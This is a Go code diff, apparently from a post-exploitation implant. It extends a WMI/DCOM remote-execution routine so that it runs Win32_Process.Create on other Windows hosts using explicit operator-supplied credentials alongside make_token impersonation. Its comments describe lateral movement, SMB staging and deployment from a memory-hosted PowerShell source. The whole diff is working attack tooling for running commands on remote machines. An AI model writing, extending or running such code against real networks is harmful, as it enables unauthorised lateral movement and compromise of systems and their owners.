@@ -6,6 +6,7 @@ import (
 	"errors"
 	"fmt"
 	"runtime"
+	"strings"
 	"sync"
 	"syscall"
 	"unsafe"
@@ -81,18 +82,25 @@ type variant struct {
 	tail     [8]byte
 }
 
+// comCallHR dispatches a COM interface method by vtable slot and returns the
+// raw HRESULT, so diagnostics can record exact result codes. Callers must
+// not hand it a nil interface.
+func comCallHR(iface, slot uintptr, args ...uintptr) uintptr {
+	vtable := *(*uintptr)(unsafe.Pointer(iface))
+	method := *(*uintptr)(unsafe.Pointer(vtable + slot*8))
+	if method == 0 {
+		return 0x80004003 // E_POINTER for a missing vtable entry
+	}
+	hr, _, _ := syscall.SyscallN(method, append([]uintptr{iface}, args...)...)
+	return hr
+}
+
 // comCall invokes a COM interface method by vtable slot. All arguments must
 // be pointer-sized; the x64 calling convention ignores the extra ones the
 // callee does not read.
 func comCall(iface, slot uintptr, args ...uintptr) error {
-	vtable := *(*uintptr)(unsafe.Pointer(iface))
-	method := *(*uintptr)(unsafe.Pointer(vtable + slot*8))
-	if method == 0 {
-		return errors.New("invalid COM vtable entry")
-	}
-	result, _, _ := syscall.SyscallN(method, append([]uintptr{iface}, args...)...)
-	if result != 0 {
-		return fmt.Errorf("COM method %d failed: 0x%08x", slot, result)
+	if hr := comCallHR(iface, slot, args...); hr != 0 {
+		return fmt.Errorf("COM method %d failed: 0x%08x", slot, hr)
 	}
 	return nil
 }
@@ -144,15 +152,91 @@ func wmiAuthentication(host string) (uintptr, uintptr, *uint16, error) {
 	return authnSvc, authority, serverPrincipal, nil
 }
 
-// wmiCreateProcess executes Win32_Process.Create over DCOM with the current
-// identity. DNS targets use one HOST SPN for both connection and proxy security.
-func wmiCreateProcess(host, command string) error {
-	authnSvc, authority, serverPrincipal, err := wmiAuthentication(host)
+// secWinNTAuthIdentity is SEC_WINNT_AUTH_IDENTITY_W: explicit credentials
+// handed to CoSetProxyBlanket so WMI method calls authenticate with the
+// operator-supplied identity instead of the process or thread token. Flag 2
+// marks the strings as Unicode.
+type secWinNTAuthIdentity struct {
+	user       *uint16
+	userLength uint32
+	domain     *uint16
+	domainLen  uint32
+	password   *uint16
+	passLen    uint32
+	flags      uint32
+}
+
+// wmiConnectIdentity prepares ConnectServer's explicit credential BSTRs.
+// Per the ConnectServer contract the domain rides in strAuthority
+// (NTLMDOMAIN:) and never inside strUser, so explicit deployments always
+// authenticate through NTLM — matching the network-only semantics of the
+// LOGON_NEW_CREDENTIALS token the worker impersonates for SMB staging.
+func wmiConnectIdentity(identity *winrmCredentials) (user, password, authority uintptr, blanket *secWinNTAuthIdentity, err error) {
+	if identity == nil {
+		return 0, 0, 0, nil, nil
+	}
+	if strings.ContainsRune(identity.user, '\\') {
+		return 0, 0, 0, nil, errors.New("lateral identity user must not embed a domain")
+	}
+	user = sysAllocString(identity.user)
+	password = sysAllocString(identity.password)
+	if user == 0 || password == 0 {
+		sysFreeString(user)
+		sysFreeString(password)
+		return 0, 0, 0, nil, errors.New("allocate WMI credential strings")
+	}
+	if identity.domain != "" {
+		// ConnectServer rejects a domain specified in both strUser and
+		// strAuthority, so the domain only travels here.
+		authority = sysAllocString("ntlmdomain:" + identity.domain)
+		if authority == 0 {
+			sysFreeString(user)
+			sysFreeString(password)
+			return 0, 0, 0, nil, errors.New("allocate WMI authority string")
+		}
+	}
+	userText, userErr := syscall.UTF16PtrFromString(identity.user)
+	domainText, domainErr := syscall.UTF16PtrFromString(identity.domain)
+	passwordText, passwordErr := syscall.UTF16PtrFromString(identity.password)
+	if userErr != nil || domainErr != nil || passwordErr != nil {
+		sysFreeString(user)
+		sysFreeString(password)
+		sysFreeString(authority)
+		return 0, 0, 0, nil, errors.New("encode lateral identity for WMI")
+	}
+	blanket = &secWinNTAuthIdentity{
+		user: userText, userLength: uint32(len(identity.user)),
+		domain: domainText, domainLen: uint32(len(identity.domain)),
+		password: passwordText, passLen: uint32(len(identity.password)),
+		flags: 2, // SEC_WINNT_AUTH_IDENTITY_UNICODE
+	}
+	runtime.KeepAlive(blanket)
+	return user, password, authority, blanket, nil
+}
+
+// wmiCreateProcess executes Win32_Process.Create over DCOM. Without an
+// explicit identity it authenticates with the current thread identity, which
+// carries the active make_token credentials when one is set (cloaking path).
+// An explicit identity travels in ConnectServer's strUser/strPassword and
+// the proxy blanket, so the DCOM handshake no longer depends on thread
+// cloaking — this keeps WMI deployments working from a memory-hosted source
+// whose process COM security the PowerShell host already owns. DNS targets
+// without explicit credentials keep one HOST SPN for connection and proxy
+// security; explicit credentials always use NTLM.
+func wmiCreateProcess(host, command string, identity *winrmCredentials) error {
+	authnSvc, authorityAmbient, serverPrincipal, err := wmiAuthentication(host)
 	if err != nil {
 		return err
 	}
-	defer sysFreeString(authority)
+	defer sysFreeString(authorityAmbient)
 	defer runtime.KeepAlive(serverPrincipal)
+	identityUser, identityPassword, identityAuthority, identityBlanket, err := wmiConnectIdentity(identity)
+	if err != nil {
+		return err
+	}
+	defer sysFreeString(identityUser)
+	defer sysFreeString(identityPassword)
+	defer sysFreeString(identityAuthority)
 	// COM apartments belong to OS threads, not goroutines.
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
@@ -177,16 +261,35 @@ func wmiCreateProcess(host, command string) error {
 		return errors.New("allocate WMI namespace string")
 	}
 	var services uintptr
-	// IWbemLocator::ConnectServer (slot 3): authenticate with the current
-	// process identity, which carries the active make_token credentials.
-	if err := comCall(locator, 3, namespace, 0, 0, 0, 0,
+	// IWbemLocator::ConnectServer (slot 3): [namespace, user, password,
+	// locale, securityFlags, authority, context, out]. Ambient deployments
+	// keep the thread identity (user/password NULL); explicit credentials
+	// replace the Kerberos authority with the NTLM domain of the payload.
+	authority := authorityAmbient
+	authnService := authnSvc
+	if identity != nil {
+		authority = identityAuthority
+		authnService = rpcCAuthnWinnt
+	}
+	if err := comCall(locator, 3, namespace, identityUser, identityPassword, 0, 0,
 		authority, 0,
 		uintptr(unsafe.Pointer(&services))); err != nil {
 		return fmt.Errorf("WMI connect to %s: %w", host, err)
 	}
 	defer comRelease(services)
-	if hr, _, _ := procCoSetProxyBlanket.Call(
-		services, authnSvc, rpcCAuthzNone, uintptr(unsafe.Pointer(serverPrincipal)),
+	// The blanket binds the SSPI identity of every WMI call on the proxy:
+	// dynamic cloaking for ambient deployments, an explicit auth identity
+	// when the operator supplied credentials.
+	if identity != nil {
+		if hr, _, _ := procCoSetProxyBlanket.Call(
+			services, rpcCAuthnWinnt, rpcCAuthzNone, 0,
+			rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, uintptr(unsafe.Pointer(identityBlanket)), 0,
+		); hr != 0 {
+			return fmt.Errorf("CoSetProxyBlanket failed: 0x%08x", hr)
+		}
+		runtime.KeepAlive(identityBlanket)
+	} else if hr, _, _ := procCoSetProxyBlanket.Call(
+		services, authnService, rpcCAuthzNone, uintptr(unsafe.Pointer(serverPrincipal)),
 		rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, 0, eoacDynamicCloaking,
 	); hr != 0 {
 		return fmt.Errorf("CoSetProxyBlanket failed: 0x%08x", hr)
